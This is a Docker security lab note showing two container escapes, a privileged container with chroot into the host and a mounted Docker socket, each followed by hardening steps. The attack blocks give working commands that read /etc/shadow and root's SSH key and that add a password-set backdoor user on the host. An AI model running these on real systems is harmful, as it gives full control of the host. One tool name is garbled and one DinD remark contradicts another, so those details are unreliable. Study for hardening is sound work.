# 💀 27 — Container Privilege Escalation & Attack Vectors

> **Session 8 (Advanced)** | Tested on: AlmaLinux 9 | Author: Ganesh

Understanding how attackers escape containers is essential for hardening them. This note documents two **real attack vectors** practised in the lab — not as exploits to use, but as **defensive knowledge** to understand exactly what you must prevent.

---

## ⚠️ Disclaimer

> [!CAUTION]
> The techniques in this note are for **educational and defensive purposes only**. They were practised in an isolated lab environment. Never attempt these on systems you don't own. Understanding attacks is the first step to preventing them.

---

## 🎯 How Containers CAN Be Broken Out Of

Container isolation comes from Linux **namespaces and cgroups** — not from a hypervisor like a VM. If Docker is misconfigured, the isolation breaks. The two most common misconfigurations:

1. **`--privileged` flag** — removes almost all isolation
2. **Mounting `/var/run/docker.sock`** — gives container full control of Docker daemon

---

## Scenario 1 — Privileged Container + chroot Escape

### The Attack

A container run with `--privileged` has:
- Access to **all host devices** (`/dev/*`)
- All Linux **capabilities** (effectively full root)
- **No seccomp** restrictions
- **No AppArmor/SELinux** restrictions

This allows mounting the host root filesystem and using `chroot` to operate as if you ARE the host.

```bash
# ⚠️ Lab: Attacker runs a privileged container with host filesystem mounted
docker run -it --rm \
  --privileged \
  -v /:/mnt \
  ubuntu bash

# Now inside the container — /mnt IS the host filesystem
ls /mnt/etc/passwd         # See host /etc/passwd
ls /mnt/root/              # See host root's home directory

# chroot into the host filesystem
chroot /mnt

# NOW you are operating with host root filesystem
cat /etc/shadow            # Read host shadow file
useradd attacker           # Create new users on host
echo "attacker:password" | chpasswd  # Set their password
# Any change here persists on the REAL host

# Or read SSH keys
cat /root/.ssh/id_rsa

exit   # Exit chroot
exit   # Exit container
```

### What Made This Possible?

- `--privileged` gave ALL capabilities + removed seccomp/AppArmor
- `-v /:/mnt` bound the REAL host root to `/mnt` in the container
- `chroot /mnt` made the container think the host filesystem IS the root
- **The container namespace meant nothing** once we chrooted out of it

### How to Prevent This

```bash
# ❌ Never do this in production
docker run --privileged -v /:/mnt ubuntu bash

# ✅ Instead — grant only specific capabilities
docker run --cap-add SYS_PTRACE ubuntu bash

# ✅ Use --read-only filesystem
docker run --read-only ubuntu bash

# ✅ Drop ALL caps and add only what's needed
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE nginx

# ✅ Use security options
docker run --security-opt no-new-privileges ubuntu bash
```

---

## Scenario 2 — Docker Socket Escape (`/var/run/docker.sock`)

### The Attack

The Docker daemon socket `/var/run/docker.sock` is the API endpoint for Docker. Anyone who can write to this socket can:
- Create new containers
- Mount the host filesystem
- Kill running containers
- Essentially **control the entire host**

If you mount this socket into a container, the container can spin up **privileged containers** on the host:

```bash
# ⚠️ Lab: Container gets access to Docker socket
docker run -v /var/run/docker.sock:/var/run/docker.sock \
  -it alpine sh

# Inside the container — install docker CLI
apk add docker-cli

# Now use Docker daemon to create a privileged container with host FS access
docker run -v /:/mnt --rm -it ubuntu bash
# Now you're in ANOTHER container with / → /mnt
# Do the chroot escape from Scenario 1...
```

This is called **Docker-in-Docker socket abuse** and is one of the most common container escape techniques.

### Real-World Context

- Many CI/CD runners mount the Docker socket to allow building images inside pipelines
- Kubernetes agents, monitoring tools, and build systems often request socket access
- If your CI job can run arbitrary code + has socket access → full host compromise

### How to Prevent This

```bash
# ❌ Never mount the Docker socket into untrusted containers
docker run -v /var/run/docker.sock:/var/run/docker.sock myimage

# ✅ Use Docker-in-Docker (DinD) instead — isolated Docker daemon
# In CI/CD, use: docker:dind image with separate daemon

# ✅ Use rootless Docker (daemon runs as non-root user)
# The socket is in $XDG_RUNTIME_DIR, not /var/run/docker.sock

# ✅ Restrict who can access the socket via group membership
ls -la /var/run/docker.sock
# srw-rw----. 1 root docker 0 ...
# Only users in 'docker' group can use it

# ✅ Use socket proxies (Tecnomatix/socat) to filter dangerous API calls
```

---

## 🔍 The `docker` Group = Root Equivalent

```bash
# Check who is in the docker group
cat /etc/group | grep docker

# Adding a user to docker group gives them root-equivalent on the host
usermod -aG docker someuser

# That user can now:
# 1. Start privileged containers with host mounts
# 2. Access /var/run/docker.sock
# 3. Escape to host with techniques above

# ✅ Prevention: Only add trusted admins to docker group
# ✅ Better: Use rootless Docker (rootless mode) so docker group = actual user
```

---

## 🛡️ Hardening Checklist

Based on these attack vectors, here is the comprehensive hardening checklist:

| # | Hardening Measure | Prevents |
|---|---|---|
| 1 | Never use `--privileged` in production | Scenario 1 escape |
| 2 | Never mount `/var/run/docker.sock` in untrusted containers | Scenario 2 escape |
| 3 | Use `--cap-drop ALL` + add only needed caps | Privilege abuse |
| 4 | Use `--security-opt no-new-privileges` | Privilege escalation |
| 5 | Use `--read-only` filesystem | Persistence attacks |
| 6 | Enable SELinux/AppArmor | File access control |
| 7 | Use custom seccomp profiles | Syscall abuse |
| 8 | Run containers as non-root user | UID 0 exploits |
| 9 | Use rootless Docker | Socket attacks |
| 10 | Restrict docker group membership | Socket attacks |
| 11 | Scan images with Trivy | CVE exploitation |
| 12 | Use user namespace remapping | UID escalation |
| 13 | Enable Docker Content Trust | Image tampering |
| 14 | Use network policies (--internal) | Lateral movement |

---

## 🔧 Rootless Docker

Running the Docker daemon itself as a non-root user is the most robust protection. If an attacker escapes the container, they only get the **unprivileged user's access** — not root.

```bash
# Install rootless Docker (AlmaLinux 9)
dnf install -y uidmap
dockerd-rootless-setuptool.sh install

# Start rootless daemon
systemctl --user start docker
systemctl --user enable docker

# Verify — daemon runs as your user
ps aux | grep dockerd
# ganesh  ... /usr/bin/dockerd-rootless.sh

# Set DOCKER_HOST for this user
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock
```

---

## 📝 Summary — What Actually Happened in the Lab

During the security session, these were the actual steps performed:

```bash
# Step 1: Privileged escape demo (root user)
docker run -it --rm --privileged -v /:/mnt ubuntu bash
# Demonstrated chroot to host FS, read /etc/shadow, /root/

# Step 2: Socket escape demo (ganesh user)
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
# Demonstrated Docker daemon control from inside container

# Step 3: User privilege discussion
cat /etc/passwd && cat /etc/shadow && cat /etc/group
# Inspected system users
useradd nehra && userdel -rf nehra  # Created/removed test user

# Step 4: Prevention techniques noted in history
# #do not give untrusted users docker access
# #use rootless docker where possible
# #restrict privileged flag
# #implement selinux or apparmor
```

---

## ⚡ Quick Reference

```bash
# ❌ Dangerous patterns — NEVER in production
docker run --privileged -v /:/mnt ubuntu bash
docker run -v /var/run/docker.sock:/var/run/docker.sock myimage
usermod -aG docker untrusted_user

# ✅ Safe hardened run command
docker run -d \
  --cap-drop ALL \
  --cap-add NET_BIND_SERVICE \
  --security-opt no-new-privileges \
  --security-opt seccomp=/etc/docker/seccomp/default.json \
  --read-only \
  --user nonroot \
  --network isolated_net \
  myapp:latest

# Inspect applied security settings
docker inspect mycontainer | grep -A 20 "HostConfig"
docker inspect mycontainer | grep -E "Privileged|CapAdd|CapDrop|SecurityOpt"
```

---

> [!TIP]
> **Next:** [28 — Docker Compose Advanced Commands](28-docker-compose-advanced.md)

---

*← [26 — Security Profiles](26-security-profiles-seccomp-capabilities-dct.md) | [28 — Docker Compose Advanced →](28-docker-compose-advanced.md)*
